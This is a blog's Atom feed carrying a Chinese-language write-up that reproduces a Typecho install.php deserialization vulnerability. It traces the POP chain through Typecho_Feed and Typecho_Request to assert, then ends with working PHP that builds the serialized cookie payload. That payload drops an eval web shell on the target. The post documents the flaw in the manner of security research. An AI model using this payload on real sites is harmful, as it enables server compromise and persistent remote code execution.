<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tharavel&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://nt0rrent.xyz/"/>
  <updated>2017-10-29T16:10:17.428Z</updated>
  <id>http://nt0rrent.xyz/</id>
  
  <author>
    <name>tharavel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>typecho反序列化漏洞复现</title>
    <link href="http://nt0rrent.xyz/2017/10/29/typecho/"/>
    <id>http://nt0rrent.xyz/2017/10/29/typecho/</id>
    <published>2017-10-29T14:51:04.482Z</published>
    <updated>2017-10-29T16:10:17.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
<h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
<h3 id="0X02-漏洞分析"><a href="#0X02-漏洞分析" class="headerlink" title="0X02 漏洞分析"></a>0X02 漏洞分析</h3><p>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下</p>
<p><pre><code><br>//判断是否已经安装<br>if (!isset($_GET[‘finish’]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . ‘/config.inc.php’) &amp;&amp; empty($_SESSION[‘typecho’])) {<br>    exit;<br>}<br>// 挡掉可能的跨站请求<br>if (!empty($_GET) || !empty($_POST)) {<br>    if (empty($_SERVER[‘HTTP_REFERER’])) {<br>        exit;<br>    }</code></pre></p>
<pre><code>$parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);
if (!empty($parts[&apos;port&apos;])) {
    $parts[&apos;host&apos;] = &quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;;
}

if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) {
    exit;
}
</code></pre><p>}<br><br>这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。</p>
<p>这里有一个反序列化操作，而参数从cookie获取，可控。   想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象<br><img src="http://op5cjcnmi.bkt.clouddn.com/2.PNG" alt="此处输入图片的描述"><br>看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中：</p>
<blockquote>
<p>Typecho_Feed<br>Typecho_Config<br>Typecho_Db_Query</p>
</blockquote>
<p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索<strong>get()方法，有好几处，分析后发现在Typecho\</strong>Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
<p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><p><code><br>&lt;?php<br>class Typecho_Feed{<br>    private $_type = ‘RSS 2.0’;<br>    private $_items;<br>    public function __construct($a)<br>    {<br>        $this-&gt;_items[] = array(‘author’=&gt;$a);<br>    }<br>}</code></p>
<p>class Typecho_Request{<br>    private $_params = array(‘screenName’=&gt;’file_put_contents(‘shell.php’, ‘&lt;?php @eval($_POST[tharavel]);?&gt;’)’);<br>    private $_filter = array(‘assert’);<br>}</p>
<p>$payload1 = new Typecho_Request();<br>$payload2 = new Typecho_Feed($payload1);<br>$exp = array(‘adapter’ =&gt; $payload2, ‘prefix’ =&gt; ‘typecho’);</p>
<p>echo base64_encode(serialize($exp));<br></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;a href=&quot;#typecho反序列化漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;/a&gt;typecho反序列化漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;0X00-前言&quot;&gt;&lt;a h
    
    </summary>
    
    
  </entry>
  
</feed>
